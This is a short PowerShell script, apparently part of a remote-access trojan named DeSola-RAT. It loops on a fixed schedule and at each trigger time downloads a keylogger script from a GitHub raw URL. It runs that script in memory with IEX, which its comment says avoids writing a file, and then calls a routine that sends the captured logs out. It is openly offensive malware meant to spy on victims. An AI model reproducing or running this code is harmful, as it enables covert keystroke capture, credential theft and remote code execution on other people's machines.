# Obfuscate function names
function Get-TriggerTimes { @('00:00:00','03:00:00','06:00:00','09:00:00','12:00:00','15:00:00','18:00:00','21:00:00') }

# Main loop
while ($true) {
    $times = Get-TriggerTimes
    foreach ($t in $times) {
        $now = Get-Date
        $target = Get-Date -Date $t
        if ($now -lt $target) {
            $diff = ($target - $now).TotalSeconds
            Start-Sleep -Seconds $diff
        }
        # Execute keylogger in memory (no file)
        $code = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/r00tm4st3r/DeSola-RAT/refs/heads/main/files/p.ps1')
        IEX $code
        # Send logs
        Send-Logs
    }
}